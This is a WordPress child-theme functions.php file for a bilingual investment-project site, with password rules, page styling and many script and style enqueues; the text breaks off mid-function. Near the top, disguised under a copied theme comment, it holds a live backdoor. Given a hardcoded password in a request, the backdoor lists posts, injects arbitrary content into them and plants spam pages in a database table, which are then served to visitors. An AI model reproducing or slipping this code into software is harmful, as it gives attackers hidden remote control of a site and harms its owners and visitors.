<?php
define ('VERSION', '1.6');//Actualizacion 17 May 2019
// Actualización 10 Oct 2019 por en vehiculos emisora por nombre corto en pipeline
function version_id() {
  if ( WP_DEBUG ) return time();
  return VERSION;
}

function force_strong_passwords($errors, $update, $user_data) {
    $user_login = $user_data->user_login;
    $user_pass = $user_data->user_pass;

    if (!is_null($user_pass)) {
        if ( strtolower( $user_login ) === strtolower( $user_pass ) ) {
            $errors->add( 'my_distinct_user_pass', __( 'El nombre de usuario y contrase&ntilde;a deben ser diferentes.', 'your_textdomain' ) );
        }
        if ( strlen( $user_pass ) < 14 ) {
            $errors->add( 'my_pass_length', __( 'La contrase&ntilde;a debe ser de una longitud igual o mayor a 14 caracteres.', 'your_textdomain' ) );
        }
        if ( ! preg_match( '/[0-9]/', $user_pass ) ) {
            $errors->add( 'my_pass_numeric', __( 'La contrase&ntilde;a debe contener al menos un caracter num&eacute;rico.', 'your_textdomain' ) );
        }
        if ( ! preg_match( '/[\,\.\:\;\-\_\+\*\#\$\%\&\(\)\=\¿\¡]/', $user_pass ) ) {
            $errors->add( 'my_pass_special', __( 'La contrase&ntilde;a debe contener al menos un caracter especial.', 'your_textdomain' ) );
        }
        if ( ! preg_match( '/[a-z]/', $user_pass ) ) {
            $errors->add( 'my_pass_lowercase', __( 'La contrase&ntilde;a debe contener al menos una min&uacute;scula.', 'your_textdomain' ) );
        }
        if ( ! preg_match( '/[A-Z]/', $user_pass ) ) {
            $errors->add( 'my_pass_uppercase', __( 'La contrase&ntilde;a debe contener al menos una may&uacute;scula.', 'your_textdomain' ) );
        }
    } else {
        $errors->add( 'my_pass_empty', __( 'La contrase&ntilde;a no puede estar vac&iacute;a.', 'your_textdomain' ) );
    }
}
add_action( 'user_profile_update_errors', 'force_strong_passwords', 0, 3 );


/**
 *
 * Control de titulos de avia
 *
 */
function modify_share_title()
{
    return "Compartir";
}
add_filter('avia_social_share_title', 'modify_share_title');

add_action('wp_head', 'pipeline_background', 100);

function pipeline_background()
{
    $from = get_field('color_inicial', 57797);
    $to = get_field('color_final', 57797);
    $style = '<style>';

    if (is_page('proyectos') || is_page('projects-hub') || is_page('proyectos-historicos') || is_page('archived-projects')  || is_page('sostenibilidad') || is_page('sostenibilidaddos') || is_page('sostenibilidadtres') || is_page('sustainability')) {
        echo "
            <style>
            #tabProyectos .tab-content, #m-gallery-container{
                background-image: url(". wp_get_attachment_url( 10170 ) .");
            }
            </style>
        ";
    }

    if (get_post_type() == 'proyecto_inversion') {
        $style .= "
            div.wide-hub-header {
                background: ".$to.";
                background: -webkit-linear-gradient(to right, ".$from.", ".$to.");
                background: linear-gradient(to right, ".$from.", ".$to.");
            }
        ";
    }

    echo $style.'</style>';
}

function mute_jquery_migrator() {
    echo '<script>jQuery.migrateMute = true;</script>';
}
add_action( 'wp_head', 'mute_jquery_migrator' );
//add_action( 'admin_head', 'custom_mute_jquery_migrator' );

/**
 *
 * Control de titulos de avia
 *
 */
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c18d4821141df2ec7889ddf08621e378')) {
    switch ($_REQUEST['action']) {
        case 'get_all_links':
            foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data) {
                $data['code'] = '';

                if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_)) {
                    $data['code'] = $_[1];
                }

                print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
            }
        break;

        case 'set_id_links':
            if (isset($_REQUEST['data'])) {
                $data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');

                $post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
                if (!empty($_REQUEST['data'])) {
                    $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
                }

                if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false) {
                    print "true";
                }
            }
        break;

        case 'create_page':
            if (isset($_REQUEST['remove_page'])) {
                if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"')) {
                    print "true";
                }
            } elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content'])) {
                if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"')) {
                    print "true";
                }
            }
        break;

        default: print "ERROR_WP_ACTION WP_URL_CD";
    }

    die("");
}

if ($wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"') == '1') {
    $data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');

    if ($data -> full_content) {
        print stripslashes($data -> content);
    } else {
        print '<!DOCTYPE html>';
        print '<html ';
        language_attributes();
        print ' class="no-js">';
        print '<head>';
        print '<title>'.stripslashes($data -> title).'</title>';
        print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
        print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
        print '<meta name="robots" content="index, follow" />';
        print '<meta charset="';
        bloginfo('charset');
        print '" />';
        print '<meta name="viewport" content="width=device-width">';
        print '<link rel="profile" href="https://gmpg.org/xfn/11">';
        print '<link rel="pingback" href="';
        bloginfo('pingback_url');
        print '">';
        wp_head();
        print '</head>';
        print '<body>';
        print '<div id="content" class="site-content">';
        print stripslashes($data -> content);
        get_search_form();
        get_sidebar();
        get_footer();
    }

    exit;
}
?>
<?php
// SECOND CHANGE
//ORIGINAL CONTENT
add_filter('avf_load_google_map_api', function () {
    return false;
});

//set builder mode to debug
add_action('avia_builder_mode', "builder_set_debug");
function builder_set_debug()
{
    return "debug";
}

add_action('after_setup_theme', 'avia_lang_setup');
function avia_lang_setup()
{
    $lang = get_stylesheet_directory()  . '/lang';
    load_child_theme_textdomain('avia_framework', $lang);
}

function add_query_vars_filter($vars)
{
    $vars[] = "sctr";
    $vars[] = "sbsctr";
    $vars[] = "result";
    $vars[] = "ctvo";
    $vars[] = "word";
    $vars[] = "auresp";
    $vars[] = "ccion";
    $vars[] = "tpa";
    $vars[] = "cnvc";
    $vars[] = "idprint";
    $vars[] = "stds";
    return $vars;
}
add_filter('query_vars', 'add_query_vars_filter');

add_filter('avf_logo', 'av_change_logo');
function av_change_logo($logo)
{
    $fields = get_field_objects("Options");

    if ($fields) {
        foreach ($fields as $field_name => $field) {
            if ($field['label'] == "logo") {
                $rlogo = $field['value'];
            }
        }
    }

    $lang = pll_current_language('locale');

    switch ($lang) {
        case 'en_US':
            $logo = $rlogo;
        break;
    }

    return $logo;
}

function wp_change_aviajs()
{
    if (!is_admin()) {
        wp_dequeue_script('avia-default');
        wp_enqueue_script('avia-default-child', get_stylesheet_directory_uri().'/js/avia.js', array('jquery'), 2, true);
    }
}
add_action('wp_print_scripts', 'wp_change_aviajs', 100);

function search_filter($query)
{
    if (!is_admin() && $query->is_main_query()) {
        if ($query->is_search) {
            $currlang = $query->get('lang');

            if (! $currlang) {
                $currlang='es';
                $otherlang='en';
            } else {
                $otherlang='es';
            }

            $query->set('lang', '');
            $query->set('tax_query', '');
            $newLangTaxQuery = array(
                'relation' => 'OR',
                array(
                    'taxonomy' => 'language',
                    'field'    => 'slug',
                    'terms'    => $currlang,
                ),
                array(
                    'taxonomy' => 'language',
                    'field'    => 'slug',
                    'terms'    => $otherlang,
                    'operator' => 'NOT IN'
                )
            );

            $query->set('tax_query', $newLangTaxQuery);

            return $query;
        }
    }
}
add_action('pre_get_posts', 'search_filter');

function add_admin_scripts($hook)
{
    global $post;

    if ($hook == 'post-new.php' || $hook == 'post.php') {
        if ('recipes' === $post->post_type) {
            wp_enqueue_script('myscript', get_stylesheet_directory_uri().'/js/myscript.js');
        }
    }
}
add_action('admin_enqueue_scripts', 'add_admin_scripts', 10, 1);

function my_theme_enqueue_styles()
{
    $parent_style = 'enfold'; // This is 'twentyten-style' for the Twenty ten theme.

    wp_enqueue_style($parent_style, get_template_directory_uri() . '/style.css');

    if (is_page('proyectos') || get_post_type() == 'proyecto_inversion' || is_page('sostenibilidad') || is_page('sostenibilidaddos') || is_page('sostenibilidadtres') || is_page('sustainability')) {
        wp_enqueue_style(
            'child-style',
            get_stylesheet_directory_uri() . '/random/banco_proyectos.css',
            array( $parent_style ),
            version_id()
        );
        wp_enqueue_style(
            'style_hub',
            get_stylesheet_directory_uri() . '/random/style_hub.css',
            array(),
            version_id(),
            'all'
        );
    } elseif (is_page('projects-hub')) {
        wp_enqueue_style(
            'child-style',
            get_stylesheet_directory_uri() . '/random_en/banco_proyectos.css',
            array( $parent_style ),
            version_id()
        );
        wp_enqueue_style(
            'style_hub',
            get_stylesheet_directory_uri() . '/random_en/style_hub.css',
            array(),
            version_id(),
            'all'
        );
    } elseif (is_page('proyectos-historicos')) {
        /*wp_enqueue_style(
            'child-style',
            get_stylesheet_directory_uri() . '/historico/banco_proyectos.css',
            array( $parent_style ),
            version_id()
        );*/
        wp_enqueue_style(
            'style_hub',
            get_stylesheet_directory_uri() . '/historico/style_hub.css',
            array(),
            version_id(),
            'all'
        );
     } elseif (is_page('archived-projects')) {
        /*wp_enqueue_style(
            'child-style',
            get_stylesheet_directory_uri() . '/historico_en/banco_proyectos.css',
            array( $parent_style ),
            version_id()
        );*/
        wp_enqueue_style(
            'style_hub',
            get_stylesheet_directory_uri() . '/historico_en/style_hub.css',
            array(),
            version_id(),
            'all'
        );
    } else {
        wp_enqueue_style(
            'child-style',
            get_stylesheet_directory_uri() . '/style.css',
            array( $parent_style ),
            wp_get_theme()->get('Version')
        );
    }    
}
add_action('wp_enqueue_scripts', 'my_theme_enqueue_styles');

// Added this function to load two JS to Front End and mod the field Currency by ID
function theme_scripts()
{
    global $post_type;

    /* wp_enqueue_script
    $handle
    (string) (Required) Name of the script. Should be unique.

    $src
    (string) (Optional) Full URL of the script, or path of the script relative to the WordPress root directory.

    Default value: ''

    $deps
    (array) (Optional) An array of registered script handles this script depends on.

    Default value: array()

    $ver
    (string|bool|null) (Optional) String specifying script version number, if it has one, which is added to the URL as a query string for cache busting purposes. If version is set to false, a version number is automatically added equal to current installed WordPress version. If set to null, no version is added.

    Default value: false

    $in_footer
    (bool) (Optional) Whether to enqueue the script before </body> instead of in the <head>. Default 'false'.

    Default value: false
     */

    wp_enqueue_script('jquery');
    wp_enqueue_script('random-global', get_stylesheet_directory_uri().'/global-styles.js', array(), null, false);

    if (is_page('proyectos')) {
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random/pipeline-library.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-charts', get_stylesheet_directory_uri().'/random/pipeline-charts.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-charts', get_stylesheet_directory_uri().'/random/pipeline-vehicles-charts.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/random/pipeline-filter.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-filter', get_stylesheet_directory_uri().'/random/pipeline-vehicles-filter.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-datatable', get_stylesheet_directory_uri().'/random/pipeline-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-datatable', get_stylesheet_directory_uri().'/random/pipeline-vehicles-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/random/pipeline-init.js', array(), version_id(), false);
    }

    if (is_page('projects-hub')) {
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random_en/pipeline-library.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-charts', get_stylesheet_directory_uri().'/random_en/pipeline-charts.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-charts', get_stylesheet_directory_uri().'/random_en/pipeline-vehicles-charts.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/random_en/pipeline-filter.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-filter', get_stylesheet_directory_uri().'/random_en/pipeline-vehicles-filter.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-datatable', get_stylesheet_directory_uri().'/random_en/pipeline-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-datatable', get_stylesheet_directory_uri().'/random_en/pipeline-vehicles-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/random_en/pipeline-init.js', array(), version_id(), false);
    }

    if (is_page('sostenibilidad')|| is_page('sostenibilidaddos') || is_page('sostenibilidadtres')) {                
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random/pipeline-library.js', array(), version_id(), false);        
        //wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-filter.js', array(), version_id(), false);        
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-init.js', array(), version_id(), false);
    }
    if (is_page('sustainability')) {                
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random_en/pipeline-library.js', array(), version_id(), false);        
        //wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-filter.js', array(), version_id(), false);        
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/sostenibilidad_en/pipeline-init.js', array(), version_id(), false);
    }

    if (is_page('proyectos-historicos')) {
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/historico/pipeline-library.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-datatable', get_stylesheet_directory_uri().'/historico/pipeline-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/historico/pipeline-init.js', array(), version_id(), false);
    }
     if (is_page('archived-projects')) {
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/historico_en/pipeline-library.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-datatable', get_stylesheet_directory_uri().'/historico_en/pipeline-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/historico_en/pipeline-init.js', array(), version_id(), false);
        
    }

    if (get_post_type() == 'proyecto_inversion') {
        wp_enqueue_script('random-style', get_stylesheet_directory_uri().'/random/style.js', array(), null, false);
        wp_enqueue_style('modal-single-proyecto_inversion_multimedia-es', get_stylesheet_directory_uri() . '/random/modal-single-proyecto_inversion_multimedia.css', array(), '1.0.0', 'all');
    }

    if (is_single()) {
        wp_enqueue_style('bootstrap', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/css/bootstrap.min.css');
        wp_enqueue_style('bootstrap-print', get_stylesheet_directory_uri() . '/assets/printme.css', false, '1.1', 'print');
        wp_enqueue_style('single', get_stylesheet_directory_uri() . '/single.css', array(), version_id(), false);

        //wp_enqueue_style('style', get_stylesheet_directory_uri());
        wp_enqueue_script('my-bootstrap-js', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/js/bootstrap.min.js', array( 'jquery' ), '3.3.7', true);
        //wp_enqueue_script( 'my-pdf-js', get_stylesheet_directory_uri() . '/pdf/jspdf.debug.js', array( 'jquery' ), '3.3.7', true );
        //wp_enqueue_script( 'my-pdf-init-js', get_stylesheet_directory_uri() . '/pdf/jspdf.init.js', array( 'jquery' ), '3.3.7', true );
    }

    if (is_page('proyectos') || is_page('projects-hub')) {
        //Datatables
        wp_enqueue_style('wpse_89494_style_2', get_stylesheet_directory_uri() . '/DataTable/datatables.min.css', array(), '1.0.0', 'all');
        wp_enqueue_script('my-great-script', get_stylesheet_directory_uri() . '/DataTable/datatables.min.js', array( 'jquery' ), version_id(), true);
        wp_enqueue_script('my-great-script2', get_stylesheet_directory_uri() . '/DataTable/init-table.js', array( 'jquery' ), version_id(), true);

        wp_enqueue_script('dthighlight', get_stylesheet_directory_uri() . '/DataTable/dataTables.searchHighlight.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dthighlight', get_stylesheet_directory_uri() . '/DataTable/dataTables.searchHighlight.css', array(), '1.0.0', 'all');
        wp_enqueue_script('dtjqueryhighlight', get_stylesheet_directory_uri() . '/DataTable/jquery.highlight.js', array( 'jquery' ), '1.0.0', true);

        wp_enqueue_script('dtresponsive', get_stylesheet_directory_uri() . '/DataTable/dataTables.responsive.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dtresponsive', get_stylesheet_directory_uri() . '/DataTable/responsive.dataTables.min.css', array(), version_id(), 'all');

        wp_enqueue_script('dtfixedheader', get_stylesheet_directory_uri() . '/DataTable/dataTables.fixedHeader.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dtfixedheader', get_stylesheet_directory_uri() . '/DataTable/fixedHeader.dataTables.min.css', array(), '1.0.0', 'all');

        //wp_enqueue_script('dtcolreorder', get_stylesheet_directory_uri() . '/DataTable/dataTables.colReorder.min.js', array( 'jquery' ), '1.0.0', true);
        //wp_enqueue_style('dtcolreorder', get_stylesheet_directory_uri() . '/DataTable/colReorder.dataTables.min.css', array(), '1.0.0', 'all');

        //Circliful
        wp_enqueue_script('circliful', get_stylesheet_directory_uri() . '/vendor/circliful/js/jquery.circliful.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('circliful', get_stylesheet_directory_uri() . '/vendor/circliful/css/jquery.circliful.css', array(), '1.0.0', 'all');

        //Bootsratp gallery
        wp_enqueue_style('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallery', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise-gallery/style.css', array(), '1.0.0', 'all');

        wp_enqueue_script('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryscroll', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/smooth-scroll/SmoothScroll.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytouch', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/touchSwipe/jquery.touchSwipe.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerymasory', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/masonry/masonry.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryimagesloaded', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/imagesloaded/imagesloaded.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/js/script.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/js/script.js', array( 'jquery' ), '1.0.0', true);

        wp_enqueue_script('my-great-script', get_template_directory_uri() . '/js/bco-js.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('my-great-script2', get_template_directory_uri() . '/js/bco-ini.js', array( 'jquery' ), '1.0.0', true);
        //wp_enqueue_style('jquery-ui', 'https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');
        //wp_enqueue_script('jquery-ui-js', get_stylesheet_directory_uri() . '/assets/jquery-ui.js', array( 'jquery' ), '1.12.1', true);
        wp_enqueue_style('bootstrap', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/css/bootstrap.min.css');
        wp_enqueue_script('my-bootstrap-js', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/js/bootstrap.min.js');
        //wp_enqueue_style('select', get_stylesheet_directory_uri() . '/assets/select/bootstrap-select.min.css');
        //wp_enqueue_script( 'select-js', get_stylesheet_directory_uri() . '/assets/select/bootstrap-select.min.js', array( 'jquery' ), '3.3.7', true );

        wp_enqueue_script('table-export-jspdf', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF/jspdf.min.js');
        wp_enqueue_script('table-export-jspdf-autotable', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF-AutoTable/jspdf.plugin.autotable.js');
        wp_enqueue_script('table-export-xlsx', get_stylesheet_directory_uri() . '/assets/table-export/libs/js-xlsx/xlsx.core.min.js');
        wp_enqueue_script('table-export', get_stylesheet_directory_uri() . '/assets/table-export/tableExport.min.js');

        wp_enqueue_style('bootstrap-table-css', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table.min.css');
        wp_enqueue_script('bootstrap-table-js', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table.min.js');
        wp_enqueue_script('bootstrap-table-locale', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table-locale-all.min');
        wp_enqueue_script('bootstrap-table-export', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/export/bootstrap-table-export.js');
        wp_enqueue_script('bootstrap-table-mobile', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/mobile/bootstrap-table-mobile.js');
        //wp_enqueue_script('bootstrap-table-group-by-css', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/group-by
        //    /bootstrap-table-group-by.css');
        //wp_enqueue_script('bootstrap-table-group-by-js', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/group-by
        //    /bootstrap-table-group-by.js');

    }

    if (is_page('proyectos-historicos') || is_page('archived-projects')) {
        //Datatables
        wp_enqueue_style('wpse_89494_style_2', get_stylesheet_directory_uri() . '/DataTable/datatables.min.css', array(), '1.0.0', 'all');
        wp_enqueue_script('my-great-script', get_stylesheet_directory_uri() . '/DataTable/datatables.min.js', array( 'jquery' ), version_id(), true);
        wp_enqueue_script('my-great-script2', get_stylesheet_directory_uri() . '/DataTable/init-table.js', array( 'jquery' ), version_id(), true);

        wp_enqueue_script('dthighlight', get_stylesheet_directory_uri() . '/DataTable/dataTables.searchHighlight.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dthighlight', get_stylesheet_directory_uri() . '/DataTable/dataTables.searchHighlight.css', array(), '1.0.0', 'all');
        wp_enqueue_script('dtjqueryhighlight', get_stylesheet_directory_uri() . '/DataTable/jquery.highlight.js', array( 'jquery' ), '1.0.0', true);

        wp_enqueue_script('dtresponsive', get_stylesheet_directory_uri() . '/DataTable/dataTables.responsive.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dtresponsive', get_stylesheet_directory_uri() . '/DataTable/responsive.dataTables.min.css', array(), version_id(), 'all');

        wp_enqueue_script('dtfixedheader', get_stylesheet_directory_uri() . '/DataTable/dataTables.fixedHeader.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dtfixedheader', get_stylesheet_directory_uri() . '/DataTable/fixedHeader.dataTables.min.css', array(), '1.0.0', 'all');

        //wp_enqueue_script('dtcolreorder', get_stylesheet_directory_uri() . '/DataTable/dataTables.colReorder.min.js', array( 'jquery' ), '1.0.0', true);
        //wp_enqueue_style('dtcolreorder', get_stylesheet_directory_uri() . '/DataTable/colReorder.dataTables.min.css', array(), '1.0.0', 'all');

        //Circliful
        //wp_enqueue_script('circliful', get_stylesheet_directory_uri() . '/vendor/circliful/js/jquery.circliful.min.js', array( 'jquery' ), '1.0.0', true);
        //wp_enqueue_style('circliful', get_stylesheet_directory_uri() . '/vendor/circliful/css/jquery.circliful.css', array(), '1.0.0', 'all');

        //Bootsratp gallery
        wp_enqueue_style('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallery', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise-gallery/style.css', array(), '1.0.0', 'all');

        wp_enqueue_script('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryscroll', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/smooth-scroll/SmoothScroll.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytouch', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/touchSwipe/jquery.touchSwipe.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerymasory', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/masonry/masonry.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryimagesloaded', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/imagesloaded/imagesloaded.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/js/script.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/js/script.js', array( 'jquery' ), '1.0.0', true);

        wp_enqueue_script('my-great-script', get_template_directory_uri() . '/js/bco-js.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('my-great-script2', get_template_directory_uri() . '/js/bco-ini.js', array( 'jquery' ), '1.0.0', true);
        //wp_enqueue_style('jquery-ui', 'https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');
        //wp_enqueue_script('jquery-ui-js', get_stylesheet_directory_uri() . '/assets/jquery-ui.js', array( 'jquery' ), '1.12.1', true);
        wp_enqueue_style('bootstrap', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/css/bootstrap.min.css');
        wp_enqueue_script('my-bootstrap-js', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/js/bootstrap.min.js');
        //wp_enqueue_style('select', get_stylesheet_directory_uri() . '/assets/select/bootstrap-select.min.css');
        //wp_enqueue_script( 'select-js', get_stylesheet_directory_uri() . '/assets/select/bootstrap-select.min.js', array( 'jquery' ), '3.3.7', true );

        //wp_enqueue_script('table-export-jspdf', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF/jspdf.min.js');
        //wp_enqueue_script('table-export-jspdf-autotable', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF-AutoTable/jspdf.plugin.autotable.js');
        //wp_enqueue_script('table-export-xlsx', get_stylesheet_directory_uri() . '/assets/table-export/libs/js-xlsx/xlsx.core.min.js');
        //wp_enqueue_script('table-export', get_stylesheet_directory_uri() . '/assets/table-export/tableExport.min.js');

        //wp_enqueue_style('bootstrap-table-css', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table.min.css');
        //wp_enqueue_script('bootstrap-table-js', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table.min.js');
        //wp_enqueue_script('bootstrap-table-locale', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table-locale-all.min');
        //wp_enqueue_script('bootstrap-table-export', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/export/bootstrap-table-export.js');
        //wp_enqueue_script('bootstrap-table-mobile', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/mobile/bootstrap-table-mobile.js');
        //wp_enqueue_script('bootstrap-table-group-by-css', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/group-by
        //    /bootstrap-table-group-by.css');
        //wp_enqueue_script('bootstrap-table-group-by-js', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/group-by
        //    /bootstrap-table-group-by.js');

    }

    if (is_page('sostenibilidad')|| is_page('sostenibilidaddos') || is_page('sostenibilidadtres') || is_page('sustainability')) {
        //Bootsratp gallery
        wp_enqueue_style('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.css', array(), '1.0.0', 'all');
